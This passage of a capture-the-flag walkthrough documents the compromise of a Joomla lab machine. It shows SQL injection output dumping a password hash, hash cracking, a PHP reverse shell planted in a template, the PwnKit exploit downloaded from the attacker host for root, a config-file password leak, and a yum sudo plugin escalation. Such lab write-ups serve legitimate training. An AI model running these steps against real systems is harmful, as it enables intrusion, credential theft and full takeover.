+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;---&#39;</span> /   /<span style=color:#e6db74>`</span> <span style=color:#e6db74>&#39;.   \  /   /` &#39;</span>.   <span style=color:#ae81ff>\ </span> __  __   ___   /|        |   |            .           
+</span></span><span style=display:flex><span>    .---..   |     <span style=color:#ae81ff>\ </span> <span style=color:#e6db74>&#39; .   |     \  &#39;</span> |  |/  <span style=color:#e6db74>`</span>.<span style=color:#e6db74>&#39;   `. ||        |   |          .&#39;</span>|           
+</span></span><span style=display:flex><span>    |   <span style=color:#f92672>||</span>   <span style=color:#e6db74>&#39;      |  &#39;</span>|   <span style=color:#e6db74>&#39;      |  &#39;</span>|   .-.  .-.   <span style=color:#e6db74>&#39;||        |   |         &lt;  |           
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    |   | `.   ` ..&#39;</span> /   <span style=color:#e6db74>`</span>.   <span style=color:#e6db74>`</span> ..<span style=color:#e6db74>&#39; /  |  |  |  |  |  |||/&#39;</span>__ <span style=color:#e6db74>&#39;. |   | .:--.&#39;</span>.  | | .<span style=color:#e6db74>&#39;&#39;&#39;-.    
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    |   |    &#39;</span>-...-<span style=color:#e6db74>&#39;`       &#39;</span>-...-<span style=color:#e6db74>&#39;`   |  |  |  |  |  ||:/`  &#39;</span>. <span style=color:#e6db74>&#39;|   |/ |   \ | | |/.&#39;&#39;&#39;</span>. <span style=color:#ae81ff>\ </span>  
+</span></span><span style=display:flex><span>    |   |                              |  |  |  |  |  <span style=color:#f92672>||</span>|     | <span style=color:#f92672>||</span>   |<span style=color:#e6db74>`</span><span style=color:#e6db74>&#34; __ | | |  /    | |   
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    |   |                              |__|  |__|  |__|||\    / &#39;|   | .&#39;.&#39;&#39;| | | |     | |   
+</span></span></span><span style=display:flex><span><span style=color:#e6db74> __.&#39;   &#39;                                              |/&#39;..&#39; / &#39;---&#39;/ /   | |_| |     | |   
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|      &#39;                                               &#39;  `&#39;-&#39;`       \ \._,\ &#39;/| &#39;.    | &#39;.  
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>|____.&#39;                                                                `--&#39;  `&#34;</span> <span style=color:#e6db74>&#39;---&#39;</span>   <span style=color:#e6db74>&#39;---&#39;</span> 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> <span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching CSRF token
+</span></span><span style=display:flex><span> <span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Testing SQLi
+</span></span><span style=display:flex><span>  -  Found table: fb9j5_users
+</span></span><span style=display:flex><span>  -  Extracting users from fb9j5_users
+</span></span><span style=display:flex><span> <span style=color:#f92672>[</span>$<span style=color:#f92672>]</span> Found user <span style=color:#f92672>[</span><span style=color:#e6db74>&#39;811&#39;</span>, <span style=color:#e6db74>&#39;Super User&#39;</span>, <span style=color:#e6db74>&#39;jonah&#39;</span>, <span style=color:#e6db74>&#39;jonah@tryhackme.com&#39;</span>, <span style=color:#e6db74>&#39;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>  -  Extracting sessions from fb9j5_session
+</span></span></code></pre></div><p>We found a user <code>jonah</code> with a password hash. Let&rsquo;s crack the hash using John The Ripper. It takes quite some time to crack the password.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>┌──<span style=color:#f92672>(</span>root㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/tryhackme<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─# cat hash.txt
+</span></span><span style=display:flex><span>$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>root㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/tryhackme<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─# john --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt hash.txt
+</span></span><span style=display:flex><span>Using default input encoding: UTF-8
+</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>bcrypt <span style=color:#f92672>[</span>Blowfish 32/64 X2<span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>iteration count<span style=color:#f92672>)</span> is <span style=color:#ae81ff>1024</span> <span style=color:#66d9ef>for</span> all loaded hashes
+</span></span><span style=display:flex><span>Will run <span style=color:#ae81ff>3</span> OpenMP threads
+</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
+</span></span><span style=display:flex><span>spiderman123     <span style=color:#f92672>(</span>?<span style=color:#f92672>)</span>     
+</span></span><span style=display:flex><span>1g 0:00:08:37 DONE <span style=color:#f92672>(</span>2023-03-20 01:18<span style=color:#f92672>)</span> 0.001933g/s 90.54p/s 90.54c/s 90.54C/s sweetsmile..speciala
+</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style=display:flex><span>Session completed. 
+</span></span></code></pre></div><p>Let&rsquo;s login to Joomla using the credentials <code>jonah</code> and <code>spiderman123</code>.</p><p>Upon navigating to the templates section and clicking on templates, we can see the templates that are being used. In each template, we can see some php files. Let&rsquo;s try to get a php reverse shell using those. Navigate to index.php file in protostar template and replace the code with the following php code.</p><blockquote><p><a href=https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p></blockquote><p>Make sure to change the ip address in the php file.</p><p>Start the netcat listener and navigate to main website that&rsquo;s being hosted on port 80.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>┌──<span style=color:#f92672>(</span>root㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/tools<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─# nc -lnvp <span style=color:#ae81ff>1234</span>
+</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1234</span> ...
+</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.6.10.164<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.59.64<span style=color:#f92672>]</span> <span style=color:#ae81ff>48864</span>
+</span></span><span style=display:flex><span>Linux dailybugle 3.10.0-1062.el7.x86_64 <span style=color:#75715e>#1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span style=display:flex><span> 01:46:50 up <span style=color:#ae81ff>34</span> min,  <span style=color:#ae81ff>0</span> users,  load average: 0.00, 0.01, 0.05
+</span></span><span style=display:flex><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>sh: no job control in this shell
+</span></span><span style=display:flex><span>sh-4.2$ 
+</span></span></code></pre></div><p>We get a foothold on the machine.</p><h1 id=privilege-escalation>Privilege Escalation
+<a class=anchor href=#privilege-escalation>#</a></h1><h2 id=method-1>Method 1
+<a class=anchor href=#method-1>#</a></h2><p>Use the PwnKit exploit to get root privileges.</p><blockquote><p><a href=https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit>https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit</a></p></blockquote><p>Download the binary to host machine and serve it using python http web server. Then download the binary to the target machine&rsquo;s /tmp directory, change the permissions to executable and run it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>python -m http.server
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sh-4.2$ wget http://10.6.10.164:8000/PwnKit
+</span></span><span style=display:flex><span>wget http://10.6.10.164:8000/PwnKit
+</span></span><span style=display:flex><span>--2023-03-20 02:01:32--  http://10.6.10.164:8000/PwnKit
+</span></span><span style=display:flex><span>Connecting to 10.6.10.164:8000... connected.
+</span></span><span style=display:flex><span>HTTP request sent, awaiting response... <span style=color:#ae81ff>200</span> OK
+</span></span><span style=display:flex><span>Length: <span style=color:#ae81ff>18040</span> <span style=color:#f92672>(</span>18K<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>application/octet-stream<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>Saving to: <span style=color:#e6db74>&#39;PwnKit&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>100%<span style=color:#f92672>[======================================</span>&gt;<span style=color:#f92672>]</span> 18,040      --.-K/s   in 0.09s   
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2023-03-20 02:01:32 <span style=color:#f92672>(</span><span style=color:#ae81ff>189</span> KB/s<span style=color:#f92672>)</span> - <span style=color:#e6db74>&#39;PwnKit&#39;</span> saved <span style=color:#f92672>[</span>18040/18040<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh-4.2$ chmod +x PwnKit
+</span></span><span style=display:flex><span>chmod +x PwnKit
+</span></span><span style=display:flex><span>sh-4.2$ ./PwnKit
+</span></span><span style=display:flex><span>./PwnKit
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@dailybugle tmp<span style=color:#f92672>]</span><span style=color:#75715e># id</span>
+</span></span><span style=display:flex><span>id
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>,48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@dailybugle tmp<span style=color:#f92672>]</span><span style=color:#75715e># </span>
+</span></span></code></pre></div><h2 id=method-2>Method 2
+<a class=anchor href=#method-2>#</a></h2><p>Download <code>linpeas.sh</code> to the target machine and run it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sh-4.2$ cd /tmp
+</span></span><span style=display:flex><span>cd /tmp
+</span></span><span style=display:flex><span>sh-4.2$ wget http://10.6.10.164:8000/linpeas.sh
+</span></span><span style=display:flex><span>wget http://10.6.10.164:8000/linpeas.sh
+</span></span><span style=display:flex><span>--2023-03-20 02:18:45--  http://10.6.10.164:8000/linpeas.sh
+</span></span><span style=display:flex><span>Connecting to 10.6.10.164:8000... connected.
+</span></span><span style=display:flex><span>HTTP request sent, awaiting response... <span style=color:#ae81ff>200</span> OK
+</span></span><span style=display:flex><span>Length: <span style=color:#ae81ff>828172</span> <span style=color:#f92672>(</span>809K<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>text/x-sh<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>Saving to: <span style=color:#e6db74>&#39;linpeas.sh&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>     0K .......... .......... .......... .......... ..........  6%  260K 3s
+</span></span><span style=display:flex><span>    50K .......... .......... .......... .......... .......... 12%  554K 2s
+</span></span><span style=display:flex><span>   100K .......... .......... .......... .......... .......... 18% 2.42M 1s
+</span></span><span style=display:flex><span>   150K .......... .......... .......... .......... .......... 24%  665K 1s
+</span></span><span style=display:flex><span>   200K .......... .......... .......... .......... .......... 30% 1.76M 1s
+</span></span><span style=display:flex><span>   250K .......... .......... .......... .......... .......... 37% 7.66M 1s
+</span></span><span style=display:flex><span>   300K .......... .......... .......... .......... .......... 43% 7.49M 1s
+</span></span><span style=display:flex><span>   350K .......... .......... .......... .......... .......... 49%  971K 0s
+</span></span><span style=display:flex><span>   400K .......... .......... .......... .......... .......... 55% 3.86M 0s
+</span></span><span style=display:flex><span>   450K .......... .......... .......... .......... .......... 61% 2.12M 0s
+</span></span><span style=display:flex><span>   500K .......... .......... .......... .......... .......... 68% 9.80M 0s
+</span></span><span style=display:flex><span>   550K .......... .......... .......... .......... .......... 74% 13.5M 0s
+</span></span><span style=display:flex><span>   600K .......... .......... .......... .......... .......... 80% 3.34M 0s
+</span></span><span style=display:flex><span>   650K .......... .......... .......... .......... .......... 86% 1.07M 0s
+</span></span><span style=display:flex><span>   700K .......... .......... .......... .......... .......... 92% 8.62M 0s
+</span></span><span style=display:flex><span>   750K .......... .......... .......... .......... .......... 98% 2.25M 0s
+</span></span><span style=display:flex><span>   800K ........                                              100% 65.8M<span style=color:#f92672>=</span>0.6s
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2023-03-20 02:18:45 <span style=color:#f92672>(</span>1.31 MB/s<span style=color:#f92672>)</span> - <span style=color:#e6db74>&#39;linpeas.sh&#39;</span> saved <span style=color:#f92672>[</span>828172/828172<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh-4.2$ chmod +x linpeas.sh
+</span></span><span style=display:flex><span>chmod +x linpeas.sh
+</span></span><span style=display:flex><span>sh-4.2$ ./linpeas.sh
+</span></span></code></pre></div><p>We found a public password in php config files.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>╔══════════╣ Searching passwords in config PHP files
+</span></span><span style=display:flex><span>        public $password <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;nv5uz9r3ZEDzVjNu&#39;</span>;
+</span></span><span style=display:flex><span>                        $this-&gt;password <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>empty<span style=color:#f92672>(</span>$this-&gt;options<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;db_pass&#39;</span><span style=color:#f92672>]))</span> ? <span style=color:#e6db74>&#39;&#39;</span> : $this-&gt;options<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;db_pass&#39;</span><span style=color:#f92672>]</span>;
+</span></span><span style=display:flex><span>                        $this-&gt;password <span style=color:#f92672>=</span> null;
+</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#39;password&#39;</span> <span style=color:#f92672>=</span>&gt; $this-&gt;password,
+</span></span></code></pre></div><p>Let&rsquo;s try this password to switch the user from <code>apache</code> to <code>jjameson</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sh-4.2$ su jjameson
+</span></span><span style=display:flex><span>su jjameson
+</span></span><span style=display:flex><span>Password: nv5uz9r3ZEDzVjNu
+</span></span><span style=display:flex><span>id
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>jjameson<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>jjameson<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>jjameson<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>whoami
+</span></span><span style=display:flex><span>jjameson
+</span></span></code></pre></div><p>It worked. We successfully changed to the user <code>jjameson</code>.</p><p>Now, let&rsquo;s see what binaries can be run using sudo.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sudo -l
+</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> jjameson on dailybugle:
+</span></span><span style=display:flex><span>    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;</span>, env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;</span>, env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;</span>, env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;</span>, env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;</span>, secure_path<span style=color:#f92672>=</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>User jjameson may run the following commands on dailybugle:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/yum
+</span></span></code></pre></div><p>The user <code>jjameson</code> can run the binary <code>yum</code> with root privileges.</p><p>Navigate to GTFO bins.</p><blockquote><p><a href=https://gtfobins.github.io/gtfobins/yum/#sudo>https://gtfobins.github.io/gtfobins/yum/#sudo</a></p></blockquote><p>We can spawn an interactive root shell by loading a custom plugin as follows.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>id    
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>jjameson<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>jjameson<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>jjameson<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>whoami
+</span></span><span style=display:flex><span>jjameson
+</span></span><span style=display:flex><span>TF<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>mktemp -d<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>cat &gt;$TF/x<span style=color:#e6db74>&lt;&lt;EOF
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[main]
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>plugins=1
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>pluginpath=$TF
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>pluginconfpath=$TF
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>EOF</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>cat &gt;$TF/y.conf<span style=color:#e6db74>&lt;&lt;EOF
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[main]
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>enabled=1
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>EOF</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>cat &gt;$TF/y.py<span style=color:#e6db74>&lt;&lt;EOF
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>import os
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>import yum
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>requires_api_version=&#39;2.1&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>def init_hook(conduit):
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  os.execl(&#39;/bin/sh&#39;,&#39;/bin/sh&#39;)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>EOF</span>
+</span></span><span style=display:flex><span>sudo yum -c $TF/x --enableplugin<span style=color:#f92672>=</span>y
+</span></span><span style=display:flex><span>Loaded plugins: y
+</span></span><span style=display:flex><span>No plugin match <span style=color:#66d9ef>for</span>: y
+</span></span><span style=display:flex><span>id
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>whoami
+</span></span><span style=display:flex><span>root
+</span></span></code></pre></div><p>We got the root shell!</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#method-1>Method 1</a></li><li><a href=#method-2>Method 2</a></li></ul></li></ul></nav></div></aside></main></body></html>
